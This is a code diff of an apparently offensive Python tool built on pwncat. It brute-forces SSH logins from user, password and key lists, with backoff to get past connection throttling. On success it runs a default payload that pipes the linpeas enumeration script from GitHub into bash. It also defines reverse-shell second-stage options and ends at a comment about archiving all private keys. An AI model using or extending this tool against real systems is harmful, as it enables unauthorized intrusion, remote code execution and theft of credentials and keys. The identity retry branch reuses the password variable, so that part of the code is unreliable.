@@ -5,10 +5,9 @@ import pwncat.manager
 from pwncat.channel import ChannelError
 import argparse
 from pathlib import Path
+import time
 
 parser = argparse.ArgumentParser(description='reverse shell listener')
-parser.add_argument('--host', dest='host', type=str,
-                    help='target host')
 parser.add_argument('--user', dest='user', type=str,
                     default=None, help='target user')
 parser.add_argument('--password', dest='password', type=str,
@@ -25,10 +24,14 @@ parser.add_argument('--payload', dest='payload', type=str,
                     default=base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex'), help='target base64 payload to deliver')
 parser.add_argument('--task', dest='task', type=str,
                     default="custom", help='target task name - use custom to execute payload')
+parser.add_argument('--target-ip', dest='target_ip', type=str,
+                    default=None, help='target ip')
+parser.add_argument('--target-port', dest='target_port', type=int,
+                    default=22, help='target port')
 parser.add_argument('--reverse-shell-host', dest='reverse_shell_host', type=str,
-                    default="custom", help='reverse shell host to be used as second stage')
+                    default=None, help='reverse shell host to be used as second stage')
 parser.add_argument('--reverse-shell-port', dest='reverse_shell_port', type=str,
-                    default="custom", help='reverse shell port to be used as second stage')
+                    default=None, help='reverse shell port to be used as second stage')
 
 args = parser.parse_args()
 
@@ -111,77 +114,174 @@ def execute(session: pwncat.manager.Session, task):
         session_lock.unlink()
 
 
-with pwncat.manager.Manager() as manager:
-    # Establish a pwncat session
-    manager.load_modules(os.path.join(os.getcwd(), "plugins"))
-    manager.config.set("verbose", True, glob=True)
+users = []
+passwords = []
+identities = []
+payload = args.payload
 
-    users = []
-    passwords = []
-    identities = []
-    payload = args.payload
+if args.user_list is not None and Path(args.user_list).exists():
+    with open(Path(args.user_list)) as f:
+        users = f.read().splitlines()
+elif args.user is not None:
+    users.append(args.user)
 
-    if args.user_list is not None and Path(args.user_list).exists():
-        with open(Path(args.user_list)) as f:
-            users = f.read().splitlines()
-    elif args.user is not None:
-        users.append(args.user)
+if args.password_list is not None and Path(args.password_list).exists():
+    with open(Path(args.password_list)) as f:
+        passwords = f.read().splitlines()
+elif args.password is not None:
+    passwords.append(args.password)
 
-    if args.password_list is not None and Path(args.user_list).exists():
-        with open(Path(args.password_list)) as f:
-            users = f.read().splitlines()
-    elif args.password is not None:
-        passwords.append(args.password)
+if args.identity_list is not None and Path(args.identity_list).exists():
+    with open(Path(args.identity_list)) as f:
+        for i in f.read().splitlines():
+            identities.append(base64.b64decode(i))
+elif args.identity is not None:
+    identities.append(base64.b64decode(args.identity))
 
-    if args.identity_list is not None and Path(args.identity_list).exists():
-        with open(Path(args.identity_list)) as f:
-            for i in f.read().splitlines():
-                identities.append(base64.b64decode(i))
-    elif args.identity is not None:
-        identities.append(base64.b64decode(args.identity))
+# check for valid state
+if not len(users):
+    raise Exception("Either --user or --user-list are required")
 
-    # check for valid state
-    if not len(users):
-        raise Exception("Either --user or --user-list are required")
+if not len(passwords) and not len(identities):
+    raise Exception(
+        "One of --password, --identity, --password-list, or --identity-list are required")
 
-    if not len(passwords) and not len(identities):
-        raise Exception(
-            "One of --password, --identity, --password-list, or --identity-list are required")
-
-    # enumerate users
-    for user in users:
-        # enumerate passwords
-        for password in passwords:
-            # ssh password connection
-            try:
+# enumerate users
+for user in users:
+    # enumerate passwords
+    for password in passwords:
+        # ssh password connection
+        try:
+            with pwncat.manager.Manager() as manager:
+                # Establish a pwncat session
+                manager.load_modules(os.path.join(os.getcwd(), "plugins"))
+                manager.config.set("verbose", True, glob=True)
+                print(
+                    f"SSH password login attempt: {user}:{password}@{args.target_ip}:{args.target_port}")
                 session = manager.create_session(
                     "linux",
-                    host=args.host,
+                    host=args.target_ip,
+                    port=args.target_port,
                     user=user,
                     password=password,
                 )
                 execute(session)
-            except ChannelError as e:
-                if e.args[0] == 'ssh authentication failed: Authentication failed.':
-                    print("Authentication failed: Bad password or user name.")
-                else:
-                    raise e
-        # enumerate identities
-        for identity in identities:
-            # ssh identity connection
-            try:
+        except ChannelError as e:
+            if e.args[0] in [
+                'ssh authentication failed: Authentication failed.',
+                'ssh connection failed: No authentication methods available',
+                'ssh connection failed: Error reading SSH protocol banner[Errno 104] Connection reset by peer'
+            ]:
+                print("Authentication failed: Bad password or user name.")
+                time.sleep(1.5)
+            elif e.args[0] in [
+                'ssh connection failed: Error reading SSH protocol banner'
+            ]:
+                reconnect = True
+                wait_loop = 1
+                while reconnect:
+                    sleep_time = 30*wait_loop
+                    print(
+                        f"Connection rejected - sleeping {sleep_time} seconds before retry")
+                    time.sleep(sleep_time)
+                    try:
+                        with pwncat.manager.Manager() as manager:
+                            # Establish a pwncat session
+                            manager.load_modules(
+                                os.path.join(os.getcwd(), "plugins"))
+                            manager.config.set("verbose", True, glob=True)
+                            print(
+                                f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
+                            session = manager.create_session(
+                                "linux",
+                                host=args.target_ip,
+                                port=args.target_port,
+                                user=user,
+                                password=password,
+                            )
+                            execute(session)
+                            reconnect = False
+                    except ChannelError as e:
+                        if e.args[0] in [
+                            'ssh connection failed: Error reading SSH protocol banner'
+                        ]:
+                            print(f"Connection error: {e.args[0]}")
+                            wait_loop += 1
+                        else:
+                            print(
+                                "Authentication failed: Bad password or user name.")
+                            time.sleep(1.5)
+                            reconnect = False
+
+            else:
+                raise e
+
+    # enumerate identities
+    for identity in identities:
+        # ssh identity connection
+        try:
+            with pwncat.manager.Manager() as manager:
+                # Establish a pwncat session
+                manager.load_modules(os.path.join(os.getcwd(), "plugins"))
+                manager.config.set("verbose", True, glob=True)
+                print(
+                    f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
                 session = manager.create_session(
                     "linux",
-                    host=args.host,
+                    host=args.target_ip,
+                    port=args.target_port,
                     user=user,
                     identity=identity,
                 )
                 execute(session)
-            except ChannelError as e:
-                if e.args[0] == 'ssh authentication failed: Authentication failed.':
-                    print("Authentication failed: Bad password or user name.")
-                else:
-                    raise e
+        except ChannelError as e:
+            if e.args[0] in [
+                'ssh authentication failed: Authentication failed.',
+                'ssh connection failed: No authentication methods available',
+                'ssh connection failed: Error reading SSH protocol banner[Errno 104] Connection reset by peer'
+            ]:
+                print("Authentication failed: Bad password or user name.")
+                time.sleep(1.5)
+            elif e.args[0] in [
+                'ssh connection failed: Error reading SSH protocol banner'
+            ]:
+                reconnect = True
+                wait_loop = 1
+                while reconnect:
+                    sleep_time = 30*wait_loop
+                    print(
+                        f"Connection rejected - sleeping {sleep_time} seconds before retry")
+                    time.sleep(sleep_time)
+                    try:
+                        with pwncat.manager.Manager() as manager:
+                            # Establish a pwncat session
+                            manager.load_modules(
+                                os.path.join(os.getcwd(), "plugins"))
+                            manager.config.set("verbose", True, glob=True)
+                            print(
+                                f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
+                            session = manager.create_session(
+                                "linux",
+                                host=args.target_ip,
+                                port=args.target_port,
+                                user=user,
+                                password=password,
+                            )
+                            execute(session)
+                            reconnect = False
+                    except ChannelError as e:
+                        if e.args[0] in [
+                            'ssh connection failed: Error reading SSH protocol banner'
+                        ]:
+                            print(f"Connection error: {e.args[0]}")
+                            wait_loop += 1
+                        else:
+                            print(
+                                "Authentication failed: Bad password or user name.")
+                            time.sleep(1.5)
+                            reconnect = False
+            else:
+                raise e
 
 
 # archive all private keys
